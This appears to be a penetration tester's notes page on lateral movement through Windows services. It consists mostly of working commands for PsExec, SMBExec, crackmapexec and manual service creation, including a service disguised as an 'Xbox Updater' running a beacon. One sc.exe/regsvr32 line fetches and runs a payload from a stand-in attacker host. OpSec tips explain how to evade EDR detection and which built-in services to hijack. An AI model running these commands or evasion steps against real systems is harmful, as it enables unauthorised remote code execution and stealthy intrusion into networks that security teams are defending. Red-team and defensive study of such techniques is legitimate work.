---
title: Lateral Movement trough Services
---

[[notes/lateral-movement/index]] by using the [MS-SCMR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/) protocol to create or update services and execute commands in system context.

Classic PsExec.
The typically flow is to upload an executable over SMB, create a service that points to the executable, start the service and send input and output over a SMB named pipe.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-psexec -k -no-pass srv01.corp.local
    ~~~

    With slightly improved OpSec ([source](https://twitter.com/_bin_Ash/status/1621627726321827840)).

    ~~~ bash
    impacket-psexec -file ./RemCom.exe -service-name WindowsTelemetry -remote-binary-name telemetry.exe -k -no-pass srv01.corp.local
    ~~~

    An obsufcated version of [RemCom](https://github.com/kavika13/RemCom) can be compiled with [RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb).

    **Warning:** Old versions create a service that allows unauthenticated remote command execution and can be exploited with [psexec_noinstall.py](https://github.com/MzHmO/psexec_noinstall) ([source](https://twitter.com/bugch3ck/status/1626963208811470848)).

=== "[psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)"
    ~~~ bat
    .\psexec.exe -accepteula -i -s \\srv01.corp.local powershell.exe
    ~~~

> **OpSec:** PsExec is very noisy. You should prefer a different technique.

A variation of PsExec is SMBExec.
It works by creating a service that executes a command, writes the output to a file and then retrieves the output over SMB.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-smbexec -k -no-pass -shell-type powershell srv01.corp.com
    ~~~

    **OpSec:** When `-mode server` is specified the command output is directly written to the attackers SMB share.

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb srv01.corp.com -u jdoe -p 'passw0rd' --exec-method smbexec -x 'whoami /all'
    ~~~

    **OpSec:** Many EDRs detecte the use of `-X`.

Upload a file and create a service manually.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-services -k -no-pass ws01.corp.local create -name XboxUpdSvc -display 'Xbox Updater' -path 'C:\Windows\Temp\beacon.exe'
    impacket-services -k -no-pass ws01.corp.local change -name XboxUpdSvc -start_name 'NT Authority\System'
    impacket-services -k -no-pass ws01.corp.local start -name XboxUpdSvc
    ~~~

=== "builtin"
    ~~~ bat
    sc.exe \\srv01.corp.local create XboxUpdSvc binpath= "C:\Windows\System32\regsvr32.exe /s /n /u /i:http://attacker.lan/setup.exe scrobj.dll"
    sc.exe \\srv01.corp.local start XboxUpdSvc
    ~~~

> **OpSec:** Modify the command of an existing service or overwrite the binary of an service to avoid detections based on remote service creation.

Builtin services that can be modified relatively safe:

~~~
icssvc
lfsvc
PerfHost
XblAuthManager
XblGameSave
XboxGipSvc
XboxNetApiSvc
~~~

Untested tools:

- [scshell](https://github.com/mr-un1k0d3r/scshell), modifies an existing service
- [NimExec](https://github.com/frkngksl/NimExec)

References:

- [The Defender’s Guide to Windows Services](http://web.archive.org/web/20230122191559/https://scribe.rip/@specterops/the-defenders-guide-to-windows-services-67c1711ecba7)
